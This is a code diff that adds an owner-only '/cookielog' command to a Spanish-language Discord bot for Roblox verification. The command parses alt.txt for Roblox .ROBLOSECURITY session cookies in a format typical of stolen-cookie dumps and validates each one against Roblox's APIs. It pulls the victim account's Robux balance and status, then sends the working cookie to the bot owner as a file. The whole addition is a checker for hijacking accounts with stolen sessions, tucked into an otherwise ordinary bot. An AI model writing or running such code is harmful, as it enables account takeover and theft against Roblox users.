@@ -2420,6 +2420,234 @@ async def check_verification(interaction: discord.Interaction, defer_response: b
         user_logger.error(f"❌ Error en verificación para {username}: {e}")
         return False
 
+@bot.tree.command(name="cookielog", description="[OWNER ONLY] Probar cookies de alt.txt y obtener información de cuenta")
+async def cookielog_command(interaction: discord.Interaction):
+    """Comando solo para el owner que prueba cookies de alt.txt"""
+    user_id = str(interaction.user.id)
+    
+    # Verificar que solo el owner pueda usar este comando
+    if user_id != DISCORD_OWNER_ID:
+        embed = discord.Embed(
+            title="❌ Acceso Denegado",
+            description="Este comando solo puede ser usado por el owner del bot.",
+            color=0xff0000
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+    
+    await interaction.response.defer(ephemeral=True)
+    
+    try:
+        # Leer cookies del archivo alt.txt
+        if not Path("alt.txt").exists():
+            embed = discord.Embed(
+                title="❌ Archivo No Encontrado",
+                description="El archivo `alt.txt` no existe.",
+                color=0xff0000
+            )
+            await interaction.followup.send(embed=embed, ephemeral=True)
+            return
+        
+        with open("alt.txt", "r", encoding="utf-8") as f:
+            content = f.read()
+        
+        # Extraer cookies de Roblox del contenido
+        roblox_cookies = []
+        lines = content.split('\n')
+        
+        for line in lines:
+            if ':gallagen.org$' in line and '_|WARNING:' in line:
+                parts = line.split(':gallagen.org$')
+                if len(parts) >= 2:
+                    cookie_part = parts[1].split(':|_')[0]
+                    full_cookie = parts[1].split(':|_')[1] if ':|_' in parts[1] else parts[1]
+                    username = parts[0]
+                    
+                    # Extraer solo la cookie de Roblox (después del segundo |_)
+                    cookie_sections = full_cookie.split('|_')
+                    if len(cookie_sections) >= 3:
+                        roblox_cookie = cookie_sections[2]
+                        roblox_cookies.append({
+                            'username': username,
+                            'cookie': roblox_cookie,
+                            'full_line': line
+                        })
+        
+        if not roblox_cookies:
+            embed = discord.Embed(
+                title="❌ Sin Cookies",
+                description="No se encontraron cookies de Roblox en el archivo alt.txt.",
+                color=0xff0000
+            )
+            await interaction.followup.send(embed=embed, ephemeral=True)
+            return
+        
+        embed = discord.Embed(
+            title="🔍 Probando Cookies",
+            description=f"Se encontraron {len(roblox_cookies)} cookies. Probando...",
+            color=0xffaa00
+        )
+        message = await interaction.followup.send(embed=embed, ephemeral=True)
+        
+        # Probar cada cookie hasta encontrar una que funcione
+        working_cookie = None
+        account_info = None
+        
+        async with aiohttp.ClientSession() as session:
+            for i, cookie_data in enumerate(roblox_cookies):
+                try:
+                    # Probar la cookie haciendo una request a Roblox
+                    headers = {
+                        'Cookie': f'.ROBLOSECURITY={cookie_data["cookie"]}',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                    }
+                    
+                    # Obtener información del usuario actual
+                    async with session.get('https://users.roblox.com/v1/users/authenticated', headers=headers) as response:
+                        if response.status == 200:
+                            user_data = await response.json()
+                            
+                            # Obtener información adicional del perfil
+                            user_id_roblox = user_data.get('id')
+                            if user_id_roblox:
+                                async with session.get(f'https://users.roblox.com/v1/users/{user_id_roblox}', headers=headers) as profile_response:
+                                    if profile_response.status == 200:
+                                        profile_data = await profile_response.json()
+                                        
+                                        # Obtener robux
+                                        robux = 0
+                                        try:
+                                            async with session.get('https://economy.roblox.com/v1/users/me', headers=headers) as economy_response:
+                                                if economy_response.status == 200:
+                                                    economy_data = await economy_response.json()
+                                                    robux = economy_data.get('robux', 0)
+                                        except:
+                                            pass
+                                        
+                                        working_cookie = cookie_data
+                                        account_info = {
+                                            'id': user_id_roblox,
+                                            'username': user_data.get('name', 'Unknown'),
+                                            'display_name': user_data.get('displayName', 'Unknown'),
+                                            'description': profile_data.get('description', ''),
+                                            'created': profile_data.get('created', ''),
+                                            'robux': robux,
+                                            'is_banned': profile_data.get('isBanned', False),
+                                            'has_verified_badge': user_data.get('hasVerifiedBadge', False)
+                                        }
+                                        break
+                
+                except Exception as e:
+                    logger.debug(f"Cookie {i+1} falló: {e}")
+                    continue
+                
+                # Actualizar progreso cada 5 cookies
+                if (i + 1) % 5 == 0:
+                    progress_embed = discord.Embed(
+                        title="🔍 Probando Cookies",
+                        description=f"Probando cookie {i+1}/{len(roblox_cookies)}...",
+                        color=0xffaa00
+                    )
+                    await message.edit(embed=progress_embed)
+        
+        if not working_cookie or not account_info:
+            embed = discord.Embed(
+                title="❌ Sin Cookies Válidas",
+                description="No se encontraron cookies que funcionen en el archivo.",
+                color=0xff0000
+            )
+            await message.edit(embed=embed)
+            return
+        
+        # Crear archivo con la información
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"cookie_info_{timestamp}.txt"
+        
+        info_content = f"""=== INFORMACIÓN DE CUENTA ROBLOX ===
+Fecha: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+Usuario original del archivo: {working_cookie['username']}
+
+=== DATOS DE LA CUENTA ===
+ID: {account_info['id']}
+Username: {account_info['username']}
+Display Name: {account_info['display_name']}
+Descripción: {account_info['description']}
+Creado: {account_info['created']}
+Robux: {account_info['robux']:,}
+Baneado: {'Sí' if account_info['is_banned'] else 'No'}
+Badge Verificado: {'Sí' if account_info['has_verified_badge'] else 'No'}
+
+=== COOKIE FUNCIONANDO ===
+.ROBLOSECURITY={working_cookie['cookie']}
+
+=== LÍNEA COMPLETA DEL ARCHIVO ===
+{working_cookie['full_line']}
+
+=== ENLACES ÚTILES ===
+Perfil: https://www.roblox.com/users/{account_info['id']}/profile
+Configuración: https://www.roblox.com/my/account
+Inventario: https://www.roblox.com/users/{account_info['id']}/inventory
+"""
+        
+        # Guardar archivo
+        with open(filename, "w", encoding="utf-8") as f:
+            f.write(info_content)
+        
+        # Crear embed de éxito
+        embed = discord.Embed(
+            title="✅ Cookie Válida Encontrada",
+            description=f"Se encontró una cookie funcionando para la cuenta **{account_info['username']}**",
+            color=0x00ff88
+        )
+        
+        embed.add_field(
+            name="👤 Información de Cuenta",
+            value=f"**ID:** {account_info['id']}\n**Username:** {account_info['username']}\n**Display Name:** {account_info['display_name']}",
+            inline=True
+        )
+        
+        embed.add_field(
+            name="💰 Robux",
+            value=f"{account_info['robux']:,}",
+            inline=True
+        )
+        
+        embed.add_field(
+            name="🏷️ Estado",
+            value=f"{'🚫 Baneado' if account_info['is_banned'] else '✅ Activo'}\n{'✅ Verificado' if account_info['has_verified_badge'] else '❌ No Verificado'}",
+            inline=True
+        )
+        
+        embed.add_field(
+            name="📁 Archivo Generado",
+            value=f"`{filename}`",
+            inline=False
+        )
+        
+        embed.set_footer(text=f"Usuario original: {working_cookie['username']}")
+        
+        # Enviar archivo
+        with open(filename, "rb") as f:
+            file = discord.File(f, filename)
+            await message.edit(embed=embed, attachments=[file])
+        
+        # Limpiar archivo temporal
+        try:
+            Path(filename).unlink()
+        except:
+            pass
+            
+        logger.info(f"Owner {interaction.user.name} obtuvo cookie válida para cuenta {account_info['username']} (ID: {account_info['id']})")
+        
+    except Exception as e:
+        logger.error(f"Error en comando cookielog: {e}")
+        embed = discord.Embed(
+            title="❌ Error",
+            description="Ocurrió un error al procesar las cookies.",
+            color=0xff0000
+        )
+        await interaction.followup.send(embed=embed, ephemeral=True)
+
 @bot.tree.command(name="verify", description="Verificar tu cuenta de Roblox usando descripción personalizada")
 async def verify_command(interaction: discord.Interaction, roblox_username: str):
     """Comando de verificación usando descripción de Roblox"""
